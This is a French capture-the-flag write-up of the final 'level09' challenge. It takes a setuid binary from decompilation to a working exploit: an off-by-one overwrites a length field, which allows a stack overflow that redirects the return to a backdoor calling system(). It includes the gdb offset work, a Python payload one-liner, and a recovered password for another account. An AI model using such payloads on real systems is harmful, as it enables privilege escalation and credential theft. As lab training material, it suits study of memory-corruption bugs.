Je commence par analyser mon environnement :

```bash
$ id && pwd && ls -la
uid=1010(level09) gid=1010(level09) groups=1010(level09),100(users)
/home/users/level09
total 25
dr-xr-x---+ 1 level09 level09    80 Oct  2  2016 .
dr-x--x--x  1 root    root      260 Oct  2  2016 ..
-rw-r--r--  1 level09 level09   220 Oct  2  2016 .bash_logout
lrwxrwxrwx  1 root    root        7 Oct  2  2016 .bash_profile -> .bashrc
-rw-r--r--  1 level09 level09  3534 Oct  2  2016 .bashrc
-rwsr-s---+ 1 end     users   12959 Oct  2  2016 level09
-rw-r--r--+ 1 level09 level09    41 Oct 19  2016 .pass
-rw-r--r--  1 level09 level09   675 Oct  2  2016 .profile
```

Je trouve un binaire `level09`, que je tente d'éxecuter :

```bash
$ ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: alex
>: Welcome, alex
>: Msg @Unix-Dude
>>: hi
>: Msg sent!
```

Je décompile le binaire avec [Dogbolt](https://dogbolt.org/?id=f1613b2e-2c3d-4b75-97e9-8137a7378884#BinaryNinja=304) en recoupant avec les compilateurs qui marchent et l'ASM :

```c
typedef struct s_msg
{
    char msg[140];
    char user[40];
    int len;
} t_msg;

void secret_backdoor()
{
    char buf[128];

    fgets(buf, 128, stdin);
    system(buf);
}

void set_msg(t_msg *msg)
{
    char buf[1024];
    memset(buf, 0, 1024);

    puts(">: Msg @Unix-Dude");
    printf(">>: ");

    fgets(buf, 1024, stdin);

    strncpy(msg->text, buf, msg->len);
}

void set_username(t_msg *msg)
{
    char buf[128];
    int i;

    memset(buf, 0, 128);

    puts(">: Enter your username");
    printf(">>: ");

    fgets(buf, 128, stdin);

    for (i = 0; i <= 40 && buf[i]; i++)
        msg->user[i] = buf[i];
    printf(">: Welcome, %s", msg->user);
}

void handle_msg()
{
    t_msg msg;
    memset(msg.user, 0, 40);
    msg.len = 140;

    set_username(&msg);
    set_msg(&msg);

    puts(">: Msg sent!");
}

int main()
{
    puts("--------------------------------------------\n|   ~Welcome to l33t-m$n ~    v1337        |\n--------------------------------------------");
    handle_msg();
    return 0;
}
```

Contrairement au deux derniers niveaux, il est ici question d'une vulnérabilité dans le code lui-même :

```c
    for (i = 0; i <= 40 && buf[i]; i++)
        msg->user[i] = buf[i];
```

et

```c
typedef struct s_msg
{
    char text[140];
    char user[40];
    int len;
} t_msg;
```

impliquent un overflow ! En effet, la boucle itère sur inférieur OU égal à 40, ce qui veut dire que l'on peut écrire 41 caractères de `buf` dans `msg->user` qui n'est déclaré qu'à 40 bytes.

En overflowant d'un byte donc, nous écrirons sur `msg->len`.
Il semble être question d'exécuter `secret_backdoor()` ici. Cependant, elle n'est appellée nul part, il faudrait donc changer la `return address` d'une fonction au travers de l'overflow, afin de faire pointer sur `secret_backdoor()`.

Je regarde où `msg->len` et ma capacité à changer sa valeur pourrait avoir un impact, et trouve :

```c
void set_msg(t_msg *msg)
{
    char buf[1024];
    memset(buf, 0, 1024);

    puts(">: Msg @Unix-Dude");
    printf(">>: ");

    fgets(buf, 1024, stdin);

    strncpy(msg->text, buf, msg->len); <------------------- ici
}
```

Qu'il est possible de faire copier "plus" dans `msg->text` que sa taille maximale (140), puisque je peux modifier un byte de l'int `len` ([soit jusqu'à 255](https://www.google.com/search?client=firefox-b-d&q=value+of+one+byte+of+int)).

Je calcule le padding nécessaire avec `gdb` :

```h
$ gdb ./level09 -q
Reading symbols from /home/users/level09/level09...(no debugging symbols found)...done.
(gdb) disas handle_msg
Dump of assembler code for function handle_msg:
   ...
   0x0000000000000924 <+100>:   lea    0x295(%rip),%rdi        # 0xbc0
   0x000000000000092b <+107>:   callq  0x730 <puts@plt>
   0x0000000000000930 <+112>:   leaveq <------------------ break ici
   0x0000000000000931 <+113>:   retq
End of assembler dump.

(gdb) b *handle_msg+112
Breakpoint 1 at 0x930

(gdb) r
Starting program: /home/users/level09/level09
warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: alex
>: Welcome, alex
>: Msg @Unix-Dude
>>: hi
>: Msg sent!

Breakpoint 1, 0x0000555555554930 in handle_msg ()
(gdb) info registers
...
rbp            0x7fffffffe580   0x7fffffffe580
rsp            0x7fffffffe4c0   0x7fffffffe4c0
...
```

Je calcule la différence entre [rbp et rsp](https://medium.com/@sharonlin/useful-registers-in-assembly-d9a9da22cdd9) : `0x7fffffffe580 - 0x7fffffffe4c0 = 0xc0 = 192` bytes. Dans l'ASM :

```h
(gdb) disas handle_msg
Dump of assembler code for function handle_msg:
   0x00000000000008c0 <+0>:     push   %rbp
   0x00000000000008c1 <+1>:     mov    %rsp,%rbp
   0x00000000000008c4 <+4>:     sub    $0xc0,%rsp
   0x00000000000008cb <+11>:    lea    -0xc0(%rbp),%rax <--------------- buffer
   0x00000000000008d2 <+18>:    add    $0x8c,%rax
   0x00000000000008d8 <+24>:    movq   $0x0,(%rax)
```

Commence à `0xc0`, soit `rbp`, donc il faut bien 192 bytes pour commencer l'overflow. Il faut ensuite ajouter 8 bytes pour atteindre la `return address` (et non 4 car nous sommes dans un système 64-bit ici).

Donc, ce qui sera écrit après le padding de 200 bytes ré-écrira l'adresse de retour de la fonction `handle_msg`. Je récupère donc l'adresse de `secret_backdoor()` :

```bash
(gdb) p secret_backdoor
$1 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>
```

En additionnant mes 200 bytes de padding ainsi que l'adresse de secret_backdoor, j'obtiens un total de 208 bytes. Il faut donc que l'overflow original qui ré-écrit sur un byte à `msg->len` lui donne la valeur de 208, afin qu'au moment où :

```c
void set_msg(t_msg *msg)
{
    ...
    strncpy(msg->text, buf, msg->len);
}
```

`set_msg` copie le buffer dans `msg->text`, il écrive 208 caractères, et non 140 au maximum, ce qui va ré-écrire la stack de `handle_msg()` et changer son adresse de retour à `secret_backdoor()`.

Je dois construire le payload avec les considérations suivante :

- 40 caractères pour remplir le buffer `msg->user`
- 1 caractère pour overflow sur `msg->len` et lui faire valoir 208 (208 en hexa = 0xd0)
- Un `\n` pour "valider" le premier `fgets()` qui demande l'username
- Le padding de 200 bytes
- Enfin, l'adresse de `secret_backdoor`

Je le construis :

```h
'\x90' * 40 + '\xd0' + '\n' + '\x90' * 200 + '\x00\x00\x55\x55\x55\x55\x48\x8c'
```

Et l'essaye :

```bash
$ (python -c "print('\x90' * 40 + '\xd0' + '\n' + '\x90' * 200 + '\x00\x00\x55\x55\x55\x55\x48\x8c'[::-1])" && cat) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, �����������������������������������������>: Msg @Unix-Dude
>>: >: Msg sent!
whoami
end
cat /home/users/end/.pass
Segmentation fault (core dumped)
```

Oups, je n'ai effectivement qu'un seul appel système possible dans secret_backdoor, je l'utilise pour cat à la place :

```bash
$ (python -c "print('\x90' * 40 + '\xd0' + '\n' + '\x90' * 200 + '\x00\x00\x55\x55\x55\x55\x48\x8c'[::-1])" && cat) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, �����������������������������������������>: Msg @Unix-Dude
>>: >: Msg sent!
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```

Et j'en ai fini d'Override ! :)
Merci de nous avoir écouté avec patience.